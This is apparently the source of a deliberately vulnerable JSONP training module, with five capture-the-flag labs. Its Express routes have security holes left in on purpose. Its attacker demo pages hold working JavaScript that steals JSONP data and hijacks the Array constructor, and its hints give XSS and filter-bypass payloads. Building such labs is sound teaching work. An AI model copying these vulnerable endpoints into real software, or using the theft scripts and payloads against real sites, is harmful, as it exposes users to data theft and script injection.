// PenTrix VulnLab module: JSONP Injection (jsonp)
// Five labs on the JSONP pattern: callback reflection, cross-origin data theft,
// naive callback blocklists, the classic Array-constructor hijack, and
// dangerous MIME types.
const express = require('express');
const { getDb } = require('../../lib/db');
const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();
// Router-scoped form parsing only (app-level middleware is out of scope).
router.use(express.urlencoded({ extended: false }));

const JSONP_SECRET = 'ALICE-JSONP-SECRET-7f3a9c';
const FRIENDS = ['alice:A1', 'bob:B2', 'carol:C3'];

// ---------------------------------------------------------------- index page
const CHALLENGES = [
  ['user', 'callback-xss'],
  ['attacker', 'csrf-data'],
  ['filtered', 'filter-bypass'],
  ['array-attacker', 'array-hijack'],
  ['snippet', 'mimetype'],
];

router.get('/', (req, res) => {
  const vulns = module.exports.vulns;
  const rows = vulns.map((v) => {
    const ch = CHALLENGES.find((c) => c[1] === v.id);
    const done = captured(req, 'jsonp', v.id);
    return `
      <div class="vuln-card">
        <h3><a href="/jsonp/${ch[0]}">${esc(v.name)}</a>
          <span class="diff">${esc(v.difficulty)}</span>
          ${done ? '<span class="captured">flag captured</span>' : ''}
        </h3>
        ${hintBox(v.hint)}
        <p><i>Attack:</i> ${esc(v.how)}</p>
      </div>`;
  }).join('\n');

  res.send(page('JSONP Injection', `
    ${brief('Module briefing', `
      <p><b>What is JSONP?</b> Before CORS, sites shared data cross-origin with
      "JSON with padding": the server wraps JSON in a caller-chosen JavaScript
      function, e.g. <code>callback({"user":"alice"})</code>, and any page loads
      it with a <code>&lt;script&gt;</code> tag. Classic <code>script</code> tags
      are exempt from the Same-Origin Policy, so <b>any site can read JSONP</b>.</p>
      <p><b>The goals here:</b> break out of the callback into executable
      JavaScript, steal JSONP data cross-origin via an attacker page, bypass a
      naive callback blocklist, replay the historic Array-constructor hijack, and
      abuse a <code>text/html</code> MIME type.</p>
      <p><b>Heads up:</b> flags from JavaScript endpoints come back in the
      <code>X-Flag</code> response header and are saved to your scoreboard.</p>`)}
    <h2>Challenges</h2>
    ${rows}
  `));
});

// ------------------------------------------------- v1: callback XSS
router.get('/user', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: the callback name is reflected into executable JavaScript with no
  // validation, so it can break out of the function-call context.
  const body = `${cb}({"user":"alice","role":"user"});`;
  if (/[^\w$.]/.test(cb)) {
    const flag = award(req, 'jsonp', 'callback-xss');
    res.set('X-Flag', flag);
  }
  res.send(body);
});

// --------------------------------------- v2: JSONP cross-origin data theft
router.get('/data', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: sensitive data is served as JSONP, readable cross-origin by any
  // page via a script tag.
  res.send(`${cb}({"user":"alice","email":"alice@example.com","secret":"${JSONP_SECRET}"});`);
});

router.get('/attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'csrf-data');
  res.send(page('Attacker page', `
    <h2>Attacker page (JSONP theft demo)</h2>
    <p>This page plays the role of <code>evil.example</code>. When it loads, it
    pulls the victim's JSONP feed with a plain <code>&lt;script&gt;</code> tag
    (the Same-Origin Policy does not apply to classic scripts) and beacons the
    data to <code>/jsonp/beacon</code>.</p>
    <pre><code>${esc('<script src="/jsonp/data?callback=steal"></script>')}</code></pre>
    <p id="status">Waiting for the JSONP response...</p>
    <script>
      function steal(d) {
        document.getElementById('status').textContent =
          'Got data for ' + d.user + '; beaconing it to /jsonp/beacon ...';
        fetch('/jsonp/beacon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(d)
        }).then(function (r) { return r.json(); }).then(function (j) {
          document.getElementById('status').innerHTML = j.ok
            ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
            : 'Beacon rejected: ' + (j.error || 'unknown');
        });
      }
    </script>
    <script src="/jsonp/data?callback=steal"></script>
    ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    <p class="note">The theft happens automatically when this page loads: the
    victim only has to visit the attacker's link while logged in.</p>
    <p><a href="/jsonp">Module index</a></p>
  `));
});

router.post('/beacon', (req, res) => {
  const b = req.body || {};
  if (b.secret === JSONP_SECRET) {
    const flag = award(req, 'jsonp', 'csrf-data');
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the stolen secret field' });
});

// -------------------------------------------- v3: callback filter bypass
router.get('/filtered', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  if (/alert/i.test(cb)) {
    return res.status(400).send(page('Blocked', `
      <h2>Callback blocked</h2>
      <p>The word "alert" is not allowed in callback names.</p>
      <p class="note">Blocklists fail when the dangerous string can be rebuilt
      at runtime. JavaScript string concatenation still works inside a callback.</p>
      <p><a href="/jsonp">Module index</a></p>
    `));
  }
  res.type('application/javascript');
  // VULN: the blocklist only bans the literal word "alert"; concatenation like
  // 'al'+'ert' rebuilds it at runtime and the filter never sees it.
  const body = `${cb}({"ok":true});`;
  if (/['"]\s*\+/.test(cb) && /[();]/.test(cb)) {
    const flag = award(req, 'jsonp', 'filter-bypass');
    res.set('X-Flag', flag);
  }
  res.send(body);
});

// --------------------------------------- v4: Array constructor hijack
router.get('/legacy', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: this legacy endpoint builds its JSONP with `new Array(...)`. An
  // attacker page that overrides the global Array constructor before loading
  // this script captures every array element (the classic 2007 hijack).
  res.send(`${cb}(new Array(${FRIENDS.map((f) => JSON.stringify(f)).join(',')}));`);
});

router.get('/array-attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'array-hijack');
  res.send(page('Array hijack demo', `
    <h2>Attacker page (Array hijack demo)</h2>
    <p>The classic 2007 attack: this page redefines the global
    <code>Array</code> constructor <b>before</b> loading the victim's JSONP.
    Because <code>/jsonp/legacy</code> emits <code>new Array(...)</code>, the
    overridden constructor runs and captures every element, then beacons them to
    <code>/jsonp/array-beacon</code>.</p>
    <p id="status">Overriding Array and loading the JSONP feed...</p>
    <script>
      // Capture the real Array BEFORE overriding: a function *declaration*
      // named Array would hoist and shadow it, so capture first, then assign.
      var RealArray = Array;
      var realSlice = RealArray.prototype.slice;
      var stolen = null;
      Array = function () { stolen = realSlice.call(arguments); };
      function gotFriends() {
        document.getElementById('status').textContent =
          'Hijacked ' + (stolen ? stolen.length : 0) + ' elements; beaconing...';
        fetch('/jsonp/array-beacon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ items: stolen })
        }).then(function (r) { return r.json(); }).then(function (j) {
          document.getElementById('status').innerHTML = j.ok
            ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
            : 'Beacon rejected: ' + (j.error || 'unknown');
        });
      }
    </script>
    <script src="/jsonp/legacy?callback=gotFriends"></script>
    ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    <p class="note">Array literals (<code>[...]</code>) do not call the
    constructor in modern engines; this works here only because the legacy
    endpoint emits <code>new Array(...)</code>. That is exactly why emitting
    <code>new Array</code> in JSONP was dangerous.</p>
    <p><a href="/jsonp">Module index</a></p>
  `));
});

router.post('/array-beacon', (req, res) => {
  const items = (req.body || {}).items;
  if (Array.isArray(items) && items.includes('alice:A1')) {
    const flag = award(req, 'jsonp', 'array-hijack');
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the hijacked items array' });
});

// --------------------------------------------------- v5: JSONP as text/html
router.get('/snippet', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 300);
  // VULN: JSONP served as text/html is parsed as a document, so HTML/JS in the
  // callback executes on direct visit or inside an iframe.
  res.set('Content-Type', 'text/html; charset=utf-8');
  const body = `${cb}({"note":"hello"});`;
  if (/</.test(cb)) {
    const flag = award(req, 'jsonp', 'mimetype');
    res.set('X-Flag', flag);
  }
  res.send(body);
});

module.exports = {
  id: 'jsonp',
  name: 'JSONP Injection',
  tagline: 'Callback reflection, cross-origin theft, and MIME trickery.',
  description: 'Five flaws in the JSONP pattern: unvalidated callback reflection, sensitive data readable cross-origin via script tags, a naive "alert" blocklist, the historic Array-constructor hijack against a legacy endpoint, and JSONP served with a text/html MIME type.',
  difficulty: 'Mixed',
  vulns: [
    {
      id: 'callback-xss',
      name: 'Callback XSS',
      difficulty: 'Easy',
      hint: 'The callback parameter is dropped straight into executable JavaScript. It does not have to stay a function name.',
      how: 'Send a callback containing JS syntax (e.g. alert(1)//) so it executes when loaded as a script.',
    },
    {
      id: 'csrf-data',
      name: 'JSONP Data Theft',
      difficulty: 'Medium',
      hint: 'Classic script tags ignore the Same-Origin Policy. Open the attacker page and watch it steal the feed.',
      how: 'Visit /jsonp/attacker so its script tag pulls /jsonp/data and beacons the secret to /jsonp/beacon.',
    },
    {
      id: 'filter-bypass',
      name: 'Callback Filter Bypass',
      difficulty: 'Medium',
      hint: 'Only the literal word "alert" is blocked. JavaScript can build strings at runtime.',
      how: 'Rebuild "alert" with concatenation (e.g. top[\'al\'+\'ert\'](1)) inside a callback that still breaks out.',
    },
    {
      id: 'array-hijack',
      name: 'Array Constructor Hijack',
      difficulty: 'Hard',
      hint: 'The legacy endpoint emits new Array(...). Override the global Array constructor before the JSONP loads.',
      how: 'Visit /jsonp/array-attacker: it redefines Array, loads the feed, and beacons the captured elements.',
    },
    {
      id: 'mimetype',
      name: 'JSONP MIME Sniffing',
      difficulty: 'Easy',
      hint: 'The response is served as text/html, so the browser parses it as a document, not just script.',
      how: 'Put an HTML tag (e.g. <script>alert(1)</script>) in the callback and open the URL directly.',
    },
  ],
  router,
};
